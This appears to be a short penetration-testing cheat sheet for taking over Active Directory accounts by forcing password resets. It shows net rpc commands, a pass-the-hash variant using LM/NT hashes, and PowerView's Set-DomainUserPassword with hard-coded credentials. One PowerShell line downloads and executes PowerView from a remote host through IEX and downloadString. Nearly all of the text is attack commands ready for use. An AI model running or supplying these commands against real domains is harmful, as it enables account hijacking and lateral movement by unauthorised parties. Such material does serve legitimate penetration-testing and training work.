## If password is known:

````bash
net rpc password jamie -U domain.local/john -S 192.168.210.10
net rpc password <target user> -U <domain/you_user> -S <dc>
````

## PTH:
```bash
pth-net rpc password <target user> "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"
```

## Powershell from another account if password is known:
````powershell
$SecPassword = ConvertTo-SecureString '!QAZ2wsx' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('zsm\marcus', $SecPassword)

$UserPassword = ConvertTo-SecureString 'Pass123!' -AsPlainText -Force
Set-DomainUserPassword -Identity jamie -AccountPassword $UserPassword -Credential $Cred
````

## Powershell if logged into account:
```powershell
IEX(New-Object Net.WebClient).downloadString('http://192.168.58.50/PowerView.ps1')  
$NewPassword = ConvertTo-SecureString 'Password123' -AsPlainText -Force 
Set-DomainUserPassword -Identity 'backup' -AccountPassword $NewPassword   
```
